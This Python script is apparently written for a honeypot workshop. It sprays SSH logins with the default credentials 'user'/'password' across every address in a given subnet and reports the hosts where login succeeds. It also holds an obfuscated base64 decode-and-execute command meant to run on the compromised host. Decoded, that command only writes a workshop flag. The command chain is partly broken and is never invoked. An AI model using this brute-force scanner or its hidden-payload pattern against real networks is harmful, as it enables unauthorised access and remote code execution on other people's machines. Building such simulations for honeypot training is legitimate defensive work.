import ipaddress, argparse, threading, paramiko
from paramiko import SSHClient

def GenerateIPs(subnet):
    ips = []
    for ip in ipaddress.IPv4Network(subnet):
        ips.append(str(ip))
        
    return ips

def RunCommands(client):
    cmdList = ["echo 'IyEvYmluL2Jhc2gKCmVjaG8gIlpHVmhkR2hqYjI1N2FEQnVNM2x3TUhSZmRISTBjSE5mZEdnelgzSXpOSEF6Y24wSyIgPj4gL3RtcC9mbGFn' | base64 -d > maintenance.sh | chmod +x maintenance.sh | sh maintenance.sh"]

    for cmd in cmdList:
        stdin, stdout, stderr = client.exec_command(cmd)
        if len(stderr) != 0:
            print(f"[-] Error encountered when running {cmd}")
        
        stdin.close()
        stdout.close()
        stderr.close()
        

def CheckSSH(ip, username, password):
    client = SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password)
        print(f"[+] Successful auth into {ip} with {username}:{password}!")
        # Run commands here

    except paramiko.ssh_exception.AuthenticationException:
        print(f"[-] Authentication failed with {username}:{password} to {ip}")
    except:
        next
        #print(f"[!] Error when trying to connect to {ip}. SSH may not be open")
    return client


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script meant to simulate attacks for Deathcon honeypot workshop")
    parser.add_argument("-r", "--range", help="subnet range to attack", required=True)
    args = parser.parse_args()

    threads = []
    ips = GenerateIPs(args.range)
    print("[+] Generated list of IPs to SSH into...")
    for i in ips:
        t = threading.Thread(target=CheckSSH, args=(i, "user", "password"))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
